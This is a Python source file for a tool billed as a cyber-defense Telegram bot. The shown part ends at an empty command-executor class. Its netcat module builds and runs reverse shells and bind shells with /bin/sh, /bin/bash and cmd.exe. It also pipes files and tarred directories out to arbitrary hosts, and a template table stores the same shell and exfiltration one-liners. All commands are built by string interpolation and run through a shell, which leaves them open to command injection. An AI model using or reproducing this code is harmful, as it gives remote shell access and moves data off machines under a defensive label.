"""
🚀 ACCURATE CYBER DEFENSE JERRY BOT
Author: Ian Carter Kulani
E-mail:iancarterkulani@gmail.com
Phone:+265 988061969

STRUCTURE:
1. Configuration & Logging
2. Database Manager (Enhanced with Netcat)
3. Traceroute Tool (Enhanced)
4. Network Scanner (Nmap + Custom)
5. Network Monitor & Threat Detection
6. Command Executor (300+ Commands + Netcat)
7. Telegram Bot Handler (All Commands + Netcat Commands)
8. Main Application Interface
"""

import os
import sys
import json
import time
import socket
import threading
import subprocess
import requests
import logging
import platform
import psutil
import hashlib
import sqlite3
import ipaddress
import re
import random
import datetime
import signal
import select
import base64
import tarfile
import io
from pathlib import Path
from typing import Dict, List, Set, Optional, Tuple, Any, Union
from dataclasses import dataclass, asdict
from colorama import init, Fore, Style, Back
import shutil
import urllib.parse
import http.client
import ssl

# Initialize colorama
init(autoreset=True)

# ============================================================================
# CONFIGURATION
# ============================================================================

# File paths
CONFIG_FILE = "cybertool_config.json"
TELEGRAM_CONFIG_FILE = "telegram_config.json"
LOG_FILE = "cybertool.log"
DATABASE_FILE = "cybertool.db"
REPORT_DIR = "reports"
COMMAND_HISTORY_FILE = "command_history.json"
SCRIPT_DIR = "scripts"

# Create necessary directories
os.makedirs(REPORT_DIR, exist_ok=True)
os.makedirs(SCRIPT_DIR, exist_ok=True)

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler(sys.stdout)
    ]
)

logger = logging.getLogger("CyberToolPro")

# ============================================================================
# NETCAT CLIENT IMPLEMENTATION
# ============================================================================

class NetcatClient:
    """Comprehensive Netcat client implementation with all options"""
    
    def __init__(self):
        self.nc_available = self._check_netcat()
        if not self.nc_available:
            logger.warning("Netcat (nc/ncat) not found. Some features will be limited.")
    
    def _check_netcat(self) -> bool:
        """Check if netcat is available"""
        for cmd in ['nc', 'ncat', 'netcat']:
            if shutil.which(cmd):
                return True
        return False
    
    def execute_nc_command(self, command: str) -> Dict[str, Any]:
        """Execute netcat command with full option support"""
        if not self.nc_available:
            return {
                'success': False,
                'error': 'Netcat not available',
                'suggestion': 'Install netcat (nc) or ncat for full functionality'
            }
        
        # Find netcat binary
        nc_binary = None
        for cmd in ['ncat', 'nc', 'netcat']:
            if shutil.which(cmd):
                nc_binary = cmd
                break
        
        if not nc_binary:
            return {
                'success': False,
                'error': 'Netcat binary not found'
            }
        
        # Execute command
        try:
            # Check if this is a listen command (contains -l)
            is_listen = '-l' in command
            timeout = 30 if is_listen else 10
            
            result = subprocess.run(
                f"{nc_binary} {command}",
                shell=True,
                capture_output=True,
                text=True,
                timeout=timeout,
                encoding='utf-8',
                errors='ignore'
            )
            
            return {
                'success': result.returncode == 0,
                'output': result.stdout if result.stdout else result.stderr,
                'returncode': result.returncode,
                'command': f"{nc_binary} {command}"
            }
        
        except subprocess.TimeoutExpired:
            return {
                'success': False,
                'error': f'Netcat command timed out after {timeout} seconds',
                'output': ''
            }
        
        except Exception as e:
            return {
                'success': False,
                'error': f'Netcat execution failed: {str(e)}',
                'output': ''
            }
    
    def nc_connect(self, host: str, port: int, verbose: int = 0, 
                  no_dns: bool = False, use_tcp: bool = True, 
                  use_udp: bool = False, ipv4: bool = False, 
                  ipv6: bool = False) -> Dict[str, Any]:
        """Netcat connect with various options"""
        cmd_parts = []
        
        # Add verbosity
        if verbose == 1:
            cmd_parts.append('-v')
        elif verbose >= 2:
            cmd_parts.append('-vv')
        
        # Add no DNS resolution
        if no_dns:
            cmd_parts.append('-n')
        
        # Add protocol
        if use_udp:
            cmd_parts.append('-u')
        # TCP is default
        
        # Add IP version
        if ipv4:
            cmd_parts.append('-4')
        elif ipv6:
            cmd_parts.append('-6')
        
        # Add host and port
        cmd_parts.append(host)
        cmd_parts.append(str(port))
        
        command = ' '.join(cmd_parts)
        return self.execute_nc_command(command)
    
    def nc_listen(self, port: int, verbose: int = 0, keepalive: bool = False,
                 bind_ip: str = None) -> Dict[str, Any]:
        """Netcat listen with various options"""
        cmd_parts = ['-l']
        
        # Add verbosity
        if verbose == 1:
            cmd_parts.append('-v')
        elif verbose >= 2:
            cmd_parts.append('-vv')
        
        # Add keepalive
        if keepalive:
            cmd_parts.append('-k')
        
        # Add bind IP if specified
        if bind_ip:
            cmd_parts.append(bind_ip)
        
        # Add port
        cmd_parts.append(str(port))
        
        command = ' '.join(cmd_parts)
        return self.execute_nc_command(command)
    
    def nc_scan_port(self, host: str, port: int, verbose: int = 0, 
                    fast: bool = False, no_dns: bool = False) -> Dict[str, Any]:
        """Netcat port scan"""
        cmd_parts = ['-z']
        
        # Add verbosity
        if verbose == 1:
            cmd_parts.append('-v')
        elif verbose >= 2:
            cmd_parts.append('-vv')
        
        # Add no DNS
        if no_dns:
            cmd_parts.append('-n')
        
        # Add host and port
        cmd_parts.append(host)
        cmd_parts.append(str(port))
        
        command = ' '.join(cmd_parts)
        return self.execute_nc_command(command)
    
    def nc_scan_range(self, host: str, port_range: str, 
                     verbose: int = 0, no_dns: bool = False) -> Dict[str, Any]:
        """Netcat port range scan"""
        cmd_parts = ['-z']
        
        # Add verbosity
        if verbose == 1:
            cmd_parts.append('-v')
        elif verbose >= 2:
            cmd_parts.append('-vv')
        
        # Add no DNS
        if no_dns:
            cmd_parts.append('-n')
        
        # Add host and port range
        cmd_parts.append(host)
        cmd_parts.append(port_range)
        
        command = ' '.join(cmd_parts)
        return self.execute_nc_command(command)
    
    def nc_with_timeout(self, host: str, port: int, timeout: int,
                       quit_after_eof: int = None) -> Dict[str, Any]:
        """Netcat with timeout options"""
        cmd_parts = []
        
        # Add timeout
        if timeout:
            cmd_parts.extend(['-w', str(timeout)])
        
        # Add quit after EOF
        if quit_after_eof:
            cmd_parts.extend(['-q', str(quit_after_eof)])
        
        # Add host and port
        cmd_parts.append(host)
        cmd_parts.append(str(port))
        
        command = ' '.join(cmd_parts)
        return self.execute_nc_command(command)
    
    def nc_with_source(self, host: str, port: int, source_port: int = None,
                      source_ip: str = None) -> Dict[str, Any]:
        """Netcat with source port/IP options"""
        cmd_parts = []
        
        # Add source port
        if source_port:
            cmd_parts.extend(['-p', str(source_port)])
        
        # Add source IP
        if source_ip:
            cmd_parts.extend(['-s', source_ip])
        
        # Add host and port
        cmd_parts.append(host)
        cmd_parts.append(str(port))
        
        command = ' '.join(cmd_parts)
        return self.execute_nc_command(command)
    
    def nc_reverse_shell(self, host: str, port: int, shell_type: str = "sh") -> Dict[str, Any]:
        """Netcat reverse shell"""
        cmd_parts = []
        
        # Add shell command based on type
        if shell_type == "sh":
            cmd_parts.extend(['-e', '/bin/sh'])
        elif shell_type == "bash":
            cmd_parts.extend(['-e', '/bin/bash'])
        elif shell_type == "windows":
            cmd_parts.extend(['-e', 'cmd.exe'])
        
        # Add host and port
        cmd_parts.append(host)
        cmd_parts.append(str(port))
        
        command = ' '.join(cmd_parts)
        return self.execute_nc_command(command)
    
    def nc_bind_shell(self, port: int, shell_type: str = "sh", 
                     keepalive: bool = True) -> Dict[str, Any]:
        """Netcat bind shell"""
        cmd_parts = ['-l']
        
        # Add keepalive
        if keepalive:
            cmd_parts.append('-k')
        
        # Add shell command based on type
        if shell_type == "sh":
            cmd_parts.extend(['-e', '/bin/sh'])
        elif shell_type == "bash":
            cmd_parts.extend(['-e', '/bin/bash'])
        elif shell_type == "windows":
            cmd_parts.extend(['-e', 'cmd.exe'])
        
        # Add port
        cmd_parts.append(str(port))
        
        command = ' '.join(cmd_parts)
        return self.execute_nc_command(command)
    
    def nc_proxy(self, host: str, port: int, proxy: str, 
                proxy_type: str = "connect") -> Dict[str, Any]:
        """Netcat through proxy"""
        cmd_parts = []
        
        # Add proxy options
        if proxy_type == "socks4":
            cmd_parts.extend(['-X', '4'])
        elif proxy_type == "socks5":
            cmd_parts.extend(['-X', '5'])
        # connect is default
        
        # Add proxy
        cmd_parts.extend(['-x', proxy])
        
        # Add host and port
        cmd_parts.append(host)
        cmd_parts.append(str(port))
        
        command = ' '.join(cmd_parts)
        return self.execute_nc_command(command)
    
    def nc_send_file(self, host: str, port: int, filename: str) -> Dict[str, Any]:
        """Send file via netcat"""
        if not os.path.exists(filename):
            return {
                'success': False,
                'error': f'File not found: {filename}'
            }
        
        try:
            # Read file content
            with open(filename, 'rb') as f:
                file_content = f.read()
            
            # Create temp file with netcat command
            temp_script = f"/tmp/nc_send_{int(time.time())}.sh"
            with open(temp_script, 'w') as f:
                f.write(f"#!/bin/bash\n")
                f.write(f"cat '{filename}' | nc {host} {port}\n")
            
            os.chmod(temp_script, 0o755)
            
            result = subprocess.run(
                ['bash', temp_script],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            os.remove(temp_script)
            
            return {
                'success': result.returncode == 0,
                'output': result.stdout if result.stdout else result.stderr,
                'returncode': result.returncode,
                'bytes_sent': len(file_content)
            }
        
        except Exception as e:
            return {
                'success': False,
                'error': f'Failed to send file: {str(e)}'
            }
    
    def nc_receive_file(self, port: int, filename: str, timeout: int = 30) -> Dict[str, Any]:
        """Receive file via netcat"""
        try:
            # Create receive command
            command = f"nc -l {port} > '{filename}'"
            
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=timeout
            )
            
            # Check if file was created
            file_exists = os.path.exists(filename)
            file_size = os.path.getsize(filename) if file_exists else 0
            
            return {
                'success': result.returncode == 0 and file_exists,
                'output': result.stdout if result.stdout else result.stderr,
                'returncode': result.returncode,
                'file_received': file_exists,
                'file_size': file_size
            }
        
        except Exception as e:
            return {
                'success': False,
                'error': f'Failed to receive file: {str(e)}'
            }
    
    def nc_send_directory(self, host: str, port: int, folder: str) -> Dict[str, Any]:
        """Send directory via netcat using tar"""
        if not os.path.exists(folder) or not os.path.isdir(folder):
            return {
                'success': False,
                'error': f'Directory not found: {folder}'
            }
        
        try:
            # Create tar and pipe to netcat
            command = f"tar czf - '{folder}' | nc {host} {port}"
            
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=60
            )
            
            return {
                'success': result.returncode == 0,
                'output': result.stdout if result.stdout else result.stderr,
                'returncode': result.returncode
            }
        
        except Exception as e:
            return {
                'success': False,
                'error': f'Failed to send directory: {str(e)}'
            }
    
    def nc_receive_directory(self, port: int, timeout: int = 60) -> Dict[str, Any]:
        """Receive directory via netcat using tar"""
        try:
            timestamp = int(time.time())
            output_dir = f"received_{timestamp}"
            
            # Create receive command
            command = f"nc -l {port} | tar xzf -"
            
            # Change to directory where we want to extract
            original_dir = os.getcwd()
            os.makedirs(output_dir, exist_ok=True)
            os.chdir(output_dir)
            
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=timeout
            )
            
            os.chdir(original_dir)
            
            # Check if files were extracted
            extracted_files = []
            for root, dirs, files in os.walk(output_dir):
                for file in files:
                    extracted_files.append(os.path.join(root, file))
            
            return {
                'success': result.returncode == 0,
                'output': result.stdout if result.stdout else result.stderr,
                'returncode': result.returncode,
                'output_directory': output_dir,
                'files_extracted': len(extracted_files)
            }
        
        except Exception as e:
            return {
                'success': False,
                'error': f'Failed to receive directory: {str(e)}'
            }
    
    def nc_send_text(self, host: str, port: int, text: str) -> Dict[str, Any]:
        """Send text via netcat"""
        try:
            # Create echo command with netcat
            encoded_text = base64.b64encode(text.encode()).decode()
            command = f"echo '{encoded_text}' | base64 -d | nc {host} {port}"
            
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=10
            )
            
            return {
                'success': result.returncode == 0,
                'output': result.stdout if result.stdout else result.stderr,
                'returncode': result.returncode,
                'bytes_sent': len(text.encode())
            }
        
        except Exception as e:
            return {
                'success': False,
                'error': f'Failed to send text: {str(e)}'
            }
    
    def nc_send_file_pipe(self, host: str, port: int, filename: str) -> Dict[str, Any]:
        """Send file via netcat using pipe"""
        return self.nc_send_file(host, port, filename)
    
    def nc_debug(self, host: str, port: int) -> Dict[str, Any]:
        """Netcat debug mode (very verbose)"""
        return self.nc_connect(host, port, verbose=2)
    
    def nc_version(self) -> Dict[str, Any]:
        """Get netcat version"""
        return self.execute_nc_command("-V")
    
    def nc_help(self) -> Dict[str, Any]:
        """Get netcat help"""
        return self.execute_nc_command("-h")
    
    def raw_nc_command(self, nc_command: str) -> Dict[str, Any]:
        """Execute raw netcat command"""
        return self.execute_nc_command(nc_command)

# ============================================================================
# DATA CLASSES
# ============================================================================

@dataclass
class ThreatAlert:
    """Threat alert data class"""
    timestamp: str
    threat_type: str
    source_ip: str
    severity: str
    description: str
    action_taken: str

@dataclass
class ScanResult:
    """Scan result data class"""
    target: str
    scan_type: str
    open_ports: List[Dict]
    timestamp: str
    success: bool
    error: Optional[str] = None

@dataclass
class NetworkConnection:
    """Network connection data class"""
    local_ip: str
    local_port: int
    remote_ip: str
    remote_port: int
    status: str
    process_name: str
    protocol: str

# ============================================================================
# CONFIGURATION MANAGER
# ============================================================================

class ConfigManager:
    """Enhanced configuration manager with validation"""
    
    DEFAULT_CONFIG = {
        "monitoring": {
            "enabled": False,
            "port_scan_threshold": 10,
            "syn_flood_threshold": 100,
            "udp_flood_threshold": 500,
            "http_flood_threshold": 200,
            "ddos_threshold": 1000
        },
        "scanning": {
            "default_ports": "1-1000",
            "timeout": 30,
            "rate_limit": False
        },
        "telegram": {
            "enabled": False,
            "token": "",
            "chat_id": "",
            "notifications": True
        },
        "security": {
            "auto_block": False,
            "log_level": "INFO",
            "backup_enabled": True
        }
    }
    
    @staticmethod
    def load_config() -> Dict:
        """Load configuration from file"""
        try:
            if os.path.exists(CONFIG_FILE):
                with open(CONFIG_FILE, 'r') as f:
                    config = json.load(f)
                    ConfigManager._deep_update(config, ConfigManager.DEFAULT_CONFIG)
                    return config
        except Exception as e:
            logger.error(f"Failed to load config: {e}")
        
        return ConfigManager.DEFAULT_CONFIG.copy()
    
    @staticmethod
    def save_config(config: Dict) -> bool:
        """Save configuration to file"""
        try:
            with open(CONFIG_FILE, 'w') as f:
                json.dump(config, f, indent=4)
            logger.info("Configuration saved successfully")
            return True
        except Exception as e:
            logger.error(f"Failed to save config: {e}")
            return False
    
    @staticmethod
    def load_telegram_config() -> Dict:
        """Load Telegram configuration"""
        try:
            if os.path.exists(TELEGRAM_CONFIG_FILE):
                with open(TELEGRAM_CONFIG_FILE, 'r') as f:
                    return json.load(f)
        except Exception as e:
            logger.error(f"Failed to load Telegram config: {e}")
        
        return {"token": "", "chat_id": "", "enabled": False}
    
    @staticmethod
    def save_telegram_config(token: str, chat_id: str, enabled: bool = True) -> bool:
        """Save Telegram configuration"""
        try:
            config = {"token": token, "chat_id": chat_id, "enabled": enabled}
            with open(TELEGRAM_CONFIG_FILE, 'w') as f:
                json.dump(config, f, indent=4)
            logger.info("Telegram configuration saved")
            return True
        except Exception as e:
            logger.error(f"Failed to save Telegram config: {e}")
            return False
    
    @staticmethod
    def _deep_update(source: Dict, updates: Dict) -> None:
        """Deep update dictionary"""
        for key, value in updates.items():
            if key in source and isinstance(source[key], dict) and isinstance(value, dict):
                ConfigManager._deep_update(source[key], value)
            else:
                source[key] = value

# ============================================================================
# DATABASE MANAGER (ENHANCED WITH NETCAT)
# ============================================================================

class DatabaseManager:
    """Enhanced database manager with comprehensive logging"""
    
    def __init__(self, db_path: str = DATABASE_FILE):
        self.db_path = db_path
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.conn.row_factory = sqlite3.Row
        self.cursor = self.conn.cursor()
        self.init_tables()
        self.init_command_templates()
    
    def init_tables(self):
        """Initialize all database tables"""
        tables = [
            # Threats table
            """
            CREATE TABLE IF NOT EXISTS threats (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                threat_type TEXT NOT NULL,
                source_ip TEXT NOT NULL,
                severity TEXT NOT NULL,
                description TEXT,
                action_taken TEXT,
                resolved BOOLEAN DEFAULT 0
            )
            """,
            
            # Commands history
            """
            CREATE TABLE IF NOT EXISTS commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                command TEXT NOT NULL,
                source TEXT DEFAULT 'local',
                success BOOLEAN DEFAULT 1,
                output TEXT,
                execution_time REAL
            )
            """,
            
            # Scan results
            """
            CREATE TABLE IF NOT EXISTS scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                target TEXT NOT NULL,
                scan_type TEXT NOT NULL,
                open_ports TEXT,
                services TEXT,
                os_info TEXT,
                execution_time REAL
            )
            """,
            
            # Network connections
            """
            CREATE TABLE IF NOT EXISTS connections (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                local_ip TEXT,
                local_port INTEGER,
                remote_ip TEXT,
                remote_port INTEGER,
                status TEXT,
                process_name TEXT,
                protocol TEXT
            )
            """,
            
            # Traceroute results
            """
            CREATE TABLE IF NOT EXISTS traceroute_results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                target TEXT NOT NULL,
                command TEXT NOT NULL,
                output TEXT,
                execution_time REAL,
                hops INTEGER
            )
            """,
            
            # Monitored IPs
            """
            CREATE TABLE IF NOT EXISTS monitored_ips (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip_address TEXT UNIQUE NOT NULL,
                added_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                is_active BOOLEAN DEFAULT 1,
                threat_level INTEGER DEFAULT 0,
                last_scan TIMESTAMP,
                notes TEXT
            )
            """,
            
            # Command templates (including Netcat)
            """
            CREATE TABLE IF NOT EXISTS command_templates (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                name TEXT UNIQUE NOT NULL,
                category TEXT NOT NULL,
                command TEXT NOT NULL,
                description TEXT,
                usage TEXT
            )
            """,
            
            # System metrics
            """
            CREATE TABLE IF NOT EXISTS system_metrics (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                cpu_percent REAL,
                memory_percent REAL,
                disk_percent REAL,
                network_sent INTEGER,
                network_recv INTEGER,
                connections_count INTEGER
            )
            """,
            
            # Netcat operations
            """
            CREATE TABLE IF NOT EXISTS netcat_operations (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                operation_type TEXT NOT NULL,
                host TEXT,
                port INTEGER,
                options TEXT,
                success BOOLEAN,
                bytes_transferred INTEGER,
                duration REAL
            )
            """
        ]
        
        for table_sql in tables:
            self.cursor.execute(table_sql)
        
        self.conn.commit()
    
    def init_command_templates(self):
        """Initialize command templates database with Netcat commands"""
        
        # Define all templates including Netcat
        templates = [
            # ==================== NETCAT COMMANDS ====================
            ('nc_connect_basic', 'netcat', 'nc {host} {port}', 'Basic netcat connection', 'nc <host> <port>'),
            ('nc_connect_verbose', 'netcat', 'nc -v {host} {port}', 'Verbose netcat connection', 'nc -v <host> <port>'),
            ('nc_connect_very_verbose', 'netcat', 'nc -vv {host} {port}', 'Very verbose netcat', 'nc -vv <host> <port>'),
            ('nc_connect_no_dns', 'netcat', 'nc -n {host} {port}', 'No DNS resolution', 'nc -n <host> <port>'),
            ('nc_connect_tcp', 'netcat', 'nc {host} {port}', 'TCP connection (default)', 'nc <host> <port>'),
            ('nc_connect_udp', 'netcat', 'nc -u {host} {port}', 'UDP connection', 'nc -u <host> <port>'),
            ('nc_connect_ipv4', 'netcat', 'nc -4 {host} {port}', 'Force IPv4', 'nc -4 <host> <port>'),
            ('nc_connect_ipv6', 'netcat', 'nc -6 {host} {port}', 'Force IPv6', 'nc -6 <host> <port>'),
            
            ('nc_listen_basic', 'netcat', 'nc -l {port}', 'Basic netcat listener', 'nc -l <port>'),
            ('nc_listen_verbose', 'netcat', 'nc -lv {port}', 'Verbose listener', 'nc -lv <port>'),
            ('nc_listen_keepalive', 'netcat', 'nc -lk {port}', 'Keep-alive listener', 'nc -lk <port>'),
            ('nc_listen_ip', 'netcat', 'nc -l {ip} {port}', 'Listener on specific IP', 'nc -l <ip> <port>'),
            
            ('nc_scan_port', 'netcat', 'nc -z {host} {port}', 'Port scan', 'nc -z <host> <port>'),
            ('nc_scan_port_verbose', 'netcat', 'nc -zv {host} {port}', 'Verbose port scan', 'nc -zv <host> <port>'),
            ('nc_scan_port_fast', 'netcat', 'nc -zvn {host} {port}', 'Fast port scan', 'nc -zvn <host> <port>'),
            ('nc_scan_range', 'netcat', 'nc -z {host} {start-end}', 'Port range scan', 'nc -z <host> <start-end>'),
            
            ('nc_timeout', 'netcat', 'nc -w {seconds} {host} {port}', 'Connection timeout', 'nc -w <seconds> <host> <port>'),
            ('nc_quit_after_eof', 'netcat', 'nc -q {seconds} {host} {port}', 'Quit after EOF', 'nc -q <seconds> <host> <port>'),
            
            ('nc_source_port', 'netcat', 'nc -p {source_port} {host} {port}', 'Specify source port', 'nc -p <source_port> <host> <port>'),
            ('nc_source_ip', 'netcat', 'nc -s {source_ip} {host} {port}', 'Specify source IP', 'nc -s <source_ip> <host> <port>'),
            
            ('nc_reverse_shell_sh', 'netcat', 'nc -e /bin/sh {host} {port}', 'Reverse shell (sh)', 'nc -e /bin/sh <host> <port>'),
            ('nc_reverse_shell_bash', 'netcat', 'nc -e /bin/bash {host} {port}', 'Reverse shell (bash)', 'nc -e /bin/bash <host> <port>'),
            ('nc_reverse_shell_windows', 'netcat', 'nc -e cmd.exe {host} {port}', 'Reverse shell (Windows)', 'nc -e cmd.exe <host> <port>'),
            ('nc_bind_shell_sh', 'netcat', 'nc -l -e /bin/sh {port}', 'Bind shell (sh)', 'nc -l -e /bin/sh <port>'),
            ('nc_bind_shell_windows', 'netcat', 'nc -l -e cmd.exe {port}', 'Bind shell (Windows)', 'nc -l -e cmd.exe <port>'),
            
            ('nc_proxy_connect', 'netcat', 'nc -x {proxy:port} {host} {port}', 'Connect via proxy', 'nc -x <proxy:port> <host> <port>'),
            ('nc_proxy_socks4', 'netcat', 'nc -X 4 -x {proxy:port} {host} {port}', 'SOCKS4 proxy', 'nc -X 4 -x <proxy:port> <host> <port>'),
            ('nc_proxy_socks5', 'netcat', 'nc -X 5 -x {proxy:port} {host} {port}', 'SOCKS5 proxy', 'nc -X 5 -x <proxy:port> <host> <port>'),
            
            ('nc_debug', 'netcat', 'nc -vv {host} {port}', 'Debug mode', 'nc -vv <host> <port>'),
            ('nc_version', 'netcat', 'nc -V', 'Version info', 'nc -V'),
            ('nc_help', 'netcat', 'nc -h', 'Help', 'nc -h'),
            
            ('nc_send_file', 'netcat', 'cat {file} | nc {host} {port}', 'Send file', 'cat <file> | nc <host> <port>'),
            ('nc_receive_file', 'netcat', 'nc -l {port} > {file}', 'Receive file', 'nc -l <port> > <file>'),
            ('nc_send_directory', 'netcat', 'tar czf - {folder} | nc {host} {port}', 'Send directory', 'tar czf - <folder> | nc <host> <port>'),
            ('nc_receive_directory', 'netcat', 'nc -l {port} | tar xzf -', 'Receive directory', 'nc -l <port> | tar xzf -'),
            ('nc_send_text', 'netcat', 'echo "{text}" | nc {host} {port}', 'Send text', 'echo "<text>" | nc <host> <port>'),
            ('nc_send_file_pipe', 'netcat', 'cat {file} | nc {host} {port}', 'Send file via pipe', 'cat <file> | nc <host> <port>'),
            
            # ==================== PING COMMANDS ====================
            ('ping_basic', 'ping', 'ping {target}', 'Basic ping', 'ping <ip>'),
            ('ping_count_4', 'ping', 'ping {target} -c 4', 'Ping with 4 packets', 'ping <ip> -c 4'),
            ('ping_count_10', 'ping', 'ping {target} -c 10', 'Ping with 10 packets', 'ping <ip> -c 10'),
            ('ping_interval_0.2', 'ping', 'ping {target} -i 0.2', 'Fast ping interval', 'ping <ip> -i 0.2'),
            
            # ==================== NMAP COMMANDS ====================
            ('nmap_basic', 'scan', 'nmap {target}', 'Basic nmap scan', 'nmap <ip>'),
            ('nmap_stealth', 'scan', 'nmap {target} -sS', 'SYN stealth scan', 'nmap <ip> -sS'),
            ('nmap_udp', 'scan', 'nmap {target} -sU', 'UDP scan', 'nmap <ip> -sU'),
            ('nmap_os', 'scan', 'nmap {target} -O', 'OS detection', 'nmap <ip> -O'),
            
            # ==================== CURL COMMANDS ====================
            ('curl_basic', 'web', 'curl {target}', 'Basic curl request', 'curl <url>'),
            ('curl_headers', 'web', 'curl {target} -I', 'Headers only', 'curl <url> -I'),
            ('curl_verbose', 'web', 'curl {target} -v', 'Verbose output', 'curl <url> -v'),
            ('curl_insecure', 'web', 'curl {target} -k', 'Allow insecure SSL', 'curl <url> -k'),
            
            # ==================== SSH COMMANDS ====================
            ('ssh_basic', 'ssh', 'ssh {target}', 'Basic SSH connection', 'ssh <host>'),
            ('ssh_port', 'ssh', 'ssh {target} -p 22', 'SSH with port', 'ssh <host> -p 22'),
            ('ssh_verbose', 'ssh', 'ssh {target} -v', 'Verbose SSH', 'ssh <host> -v'),
            ('ssh_very_verbose', 'ssh', 'ssh {target} -vvv', 'Very verbose SSH', 'ssh <host> -vvv'),
            
            # ==================== SYSTEM COMMANDS ====================
            ('netstat_all', 'system', 'netstat -an', 'All connections', 'netstat -an'),
            ('netstat_listen', 'system', 'netstat -tulpn', 'Listening ports', 'netstat -tulpn'),
            ('ifconfig', 'system', 'ifconfig', 'Interface configuration', 'ifconfig'),
            ('ps_aux', 'system', 'ps aux', 'Process list', 'ps aux'),
            ('top', 'system', 'top -b -n 1', 'Process snapshot', 'top -b -n 1'),
        ]
        
        for template in templates:
            try:
                self.cursor.execute('''
                    INSERT OR IGNORE INTO command_templates (name, category, command, description, usage)
                    VALUES (?, ?, ?, ?, ?)
                ''', template)
            except Exception as e:
                logger.error(f"Failed to insert template {template[0]}: {e}")
        
        self.conn.commit()
    
    def log_netcat_operation(self, operation_type: str, host: str = None, 
                           port: int = None, options: str = "", 
                           success: bool = True, bytes_transferred: int = 0,
                           duration: float = 0.0):
        """Log netcat operation to database"""
        try:
            self.cursor.execute('''
                INSERT INTO netcat_operations (operation_type, host, port, options, success, bytes_transferred, duration)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            ''', (operation_type, host, port, options, success, bytes_transferred, duration))
            self.conn.commit()
            logger.info(f"Netcat operation logged: {operation_type}")
        except Exception as e:
            logger.error(f"Failed to log netcat operation: {e}")
    
    def get_netcat_history(self, limit: int = 20) -> List[Dict]:
        """Get netcat operation history"""
        try:
            self.cursor.execute('''
                SELECT * FROM netcat_operations ORDER BY timestamp DESC LIMIT ?
            ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get netcat history: {e}")
            return []
    
    def log_threat(self, alert: ThreatAlert):
        """Log threat to database"""
        try:
            self.cursor.execute('''
                INSERT INTO threats (timestamp, threat_type, source_ip, severity, description, action_taken)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (alert.timestamp, alert.threat_type, alert.source_ip, 
                  alert.severity, alert.description, alert.action_taken))
            self.conn.commit()
            logger.info(f"Threat logged: {alert.threat_type} from {alert.source_ip}")
        except Exception as e:
            logger.error(f"Failed to log threat: {e}")
    
    def log_command(self, command: str, source: str = "local", success: bool = True, 
                   output: str = "", execution_time: float = 0.0):
        """Log command execution"""
        try:
            self.cursor.execute('''
                INSERT INTO commands (command, source, success, output, execution_time)
                VALUES (?, ?, ?, ?, ?)
            ''', (command, source, success, output[:10000], execution_time))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log command: {e}")
    
    def get_recent_threats(self, limit: int = 10) -> List[Dict]:
        """Get recent threats"""
        try:
            self.cursor.execute('''
                SELECT * FROM threats ORDER BY timestamp DESC LIMIT ?
            ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get threats: {e}")
            return []
    
    def get_command_history(self, limit: int = 20) -> List[Dict]:
        """Get command history"""
        try:
            self.cursor.execute('''
                SELECT command, source, timestamp, success FROM commands 
                ORDER BY timestamp DESC LIMIT ?
            ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get command history: {e}")
            return []
    
    def get_command_templates(self, category: str = None) -> List[Dict]:
        """Get command templates"""
        try:
            if category:
                self.cursor.execute('''
                    SELECT * FROM command_templates WHERE category = ? ORDER BY name
                ''', (category,))
            else:
                self.cursor.execute('''
                    SELECT * FROM command_templates ORDER BY category, name
                ''')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get command templates: {e}")
            return []
    
    def get_statistics(self) -> Dict:
        """Get database statistics"""
        stats = {}
        try:
            self.cursor.execute('SELECT COUNT(*) FROM threats')
            stats['total_threats'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM commands')
            stats['total_commands'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM scans')
            stats['total_scans'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM monitored_ips WHERE is_active = 1')
            stats['active_monitored_ips'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM netcat_operations')
            stats['netcat_operations'] = self.cursor.fetchone()[0]
            
        except Exception as e:
            logger.error(f"Failed to get statistics: {e}")
        
        return stats
    
    def close(self):
        """Close database connection"""
        try:
            self.conn.close()
            logger.info("Database connection closed")
        except Exception as e:
            logger.error(f"Error closing database: {e}")

# ============================================================================
# COMMAND EXECUTOR (ENHANCED WITH NETCAT)
# ============================================================================

class CommandExecutor:
